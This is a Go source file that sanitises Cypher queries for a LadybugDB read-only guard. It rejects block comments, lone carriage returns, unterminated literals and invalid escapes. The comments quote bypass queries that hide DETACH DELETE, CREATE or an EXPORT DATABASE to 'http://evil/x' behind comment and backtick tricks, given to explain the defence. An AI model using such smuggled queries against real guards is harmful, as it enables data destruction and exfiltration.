package graphquery

import "strings"

// sanitize removes line comments (//…) and string / backtick-identifier
// literals, replacing each with a space so token boundaries survive. This is
// what lets the keyword checks ignore literal content: a query like
// MATCH (n) WHERE n.name = 'DROP everything' RETURN n is read-only.
//
// It returns ok=false for any input whose lexing could differ from Ladybug's lexer
// (src/antlr4/Cypher.g4 in the LadybugDB source at the tag pinned in
// scripts/fetch-ladybug.sh, e.g. v0.21.2:
// https://github.com/LadybugDB/ladybug/blob/v0.21.2/src/antlr4/Cypher.g4).
// Every such divergence is a potential
// bypass: if the guard believes a region is a comment or literal while the
// engine lexes it as code, the hidden region executes unchecked. Two such
// inputs:
//
//	MATCH (n) /* **/ ' */ DETACH DELETE n //'
//	RETURN 1 /* **/ ' */; CREATE (x:Evil) //'
//
// A guard that ends the block comment at the first */ takes ' */ … //' as a
// string literal; the grammar (CypherComment) keeps the comment open past
// **/, closes it at the second */, and the DETACH DELETE / CREATE runs. Rather
// than re-implement the grammar's comment rule exactly, the guard refuses
// wherever it might disagree with the engine:
//   - block comments (/* */) anywhere outside a literal;
//   - a line comment ended by a lone \r (the grammar's rule is CR? (LF|EOF), so
//     the comment token fails to lex and its body is tokenized as code);
//   - unterminated string / backtick literals (the lexer emits the quote as an
//     Unknown token and lexes the remainder as code);
//   - string escapes outside the grammar's EscapedChar set (same failure mode).
func sanitize(q string) (string, bool) {
	var b strings.Builder
	b.Grow(len(q))
	r := []byte(q)
	n := len(r)
	for i := 0; i < n; i++ {
		switch {
		case r[i] == '/' && i+1 < n && r[i+1] == '/':
			for i < n && r[i] != '\n' && r[i] != '\r' {
				i++
			}
			if i < n && r[i] == '\r' && (i+1 >= n || r[i+1] != '\n') {
				return "", false
			}
			b.WriteByte(' ')
		case r[i] == '/' && i+1 < n && r[i+1] == '*':
			return "", false
		case r[i] == '\'' || r[i] == '"' || r[i] == '`':
			end, ok := literalEnd(r, i)
			if !ok {
				return "", false
			}
			i = end
			b.WriteByte(' ')
		default:
			b.WriteByte(r[i])
		}
	}
	return strings.TrimSpace(b.String()), true
}

// literalEnd returns the index of the quote closing the literal opened at
// r[start], or ok=false if it is unterminated or contains an escape the
// grammar's lexer would reject.
//
// Backslash escaping applies to STRING literals only. A backtick-quoted
// identifier ends at the very next backtick, full stop — the grammar is
// `EscapedSymbolicName_0 : ~[`]`, i.e. any character including a backslash.
// Honouring \ inside backticks once made this guard disagree with the engine,
// and the disagreement was a full bypass of the read-only guarantee:
//
//	MATCH (`n\`) DETACH DELETE n RETURN 1
//	MATCH (`n\`) RETURN 1; EXPORT DATABASE 'http://evil/x'
//
// Ladybug executes every ';'-separated statement in one call
// (ClientContext::queryNoLock), and oC_Statement admits INSTALL/LOAD
// EXTENSION, EXPORT DATABASE, ATTACH and DROP.
func literalEnd(r []byte, start int) (int, bool) {
	quote := r[start]
	for i := start + 1; i < len(r); i++ {
		switch {
		case r[i] == quote:
			return i, true
		case quote != '`' && r[i] == '\\':
			skip, ok := escapeLen(r[i+1:])
			if !ok {
				return 0, false
			}
			i += skip
		}
	}
	return 0, false
}

// escapeLen validates the escape following a backslash against the grammar's
// EscapedChar rule and returns how many bytes it spans.
func escapeLen(rest []byte) (int, bool) {
	if len(rest) == 0 {
		return 0, false
	}
	switch rest[0] {
	case '\\', '\'', '"', 'B', 'b', 'F', 'f', 'N', 'n', 'R', 'r', 'T', 't':
		return 1, true
	case 'U', 'u':
		hex := 0
		for hex < 8 && hex+1 < len(rest) && isHex(rest[hex+1]) {
			hex++
		}
		switch {
		case hex == 8:
			return 9, true
		case hex >= 4:
			return 5, true
		}
	}
	return 0, false
}

func isHex(b byte) bool {
	return (b >= '0' && b <= '9') || (b >= 'a' && b <= 'f') || (b >= 'A' && b <= 'F')
}
